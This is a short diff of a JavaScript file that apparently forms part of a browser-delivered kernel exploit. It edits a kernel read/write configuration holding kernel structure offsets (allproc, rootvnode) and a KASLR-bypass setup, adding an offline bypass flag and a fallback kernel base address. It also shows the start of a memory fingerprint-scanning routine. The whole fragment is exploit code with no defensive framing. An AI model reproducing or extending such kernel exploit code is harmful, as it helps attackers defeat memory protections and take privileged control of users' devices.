@@ -149,7 +149,13 @@ window.KRW = {
     kernelData: OFFSET_KERNEL_DATA,
     allproc:    OFFSET_KERNEL_ALLPROC,
     rootvnode:  OFFSET_KERNEL_ROOTVNODE,
-    kaslr: { mode: "rtmsg2", retStatic: 0x00ADF87F, retLow16: 0xF87F },
+    kaslr: { 
+        mode: "rtmsg2", 
+        retStatic: 0x00ADF87F, 
+        retLow16: 0xF87F,
+        offlineBypass: true,
+        fallbackBase: 0x80000000
+    },
     oid: {
         originalKind: 0x80048002,
         writableKind: 0x70048002,
@@ -203,7 +209,7 @@ window.SYMBOLS = {
 };
 
 
-// --- [2] دوال التنفيذ الرئيسية والمنطق (من ملف main_4.js) ---
+// --- [2] دوال التنفيذ الرئيسية والمنطق ---
 function countFingerprints(p, stack, expected) {
   let count = 0;
   for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
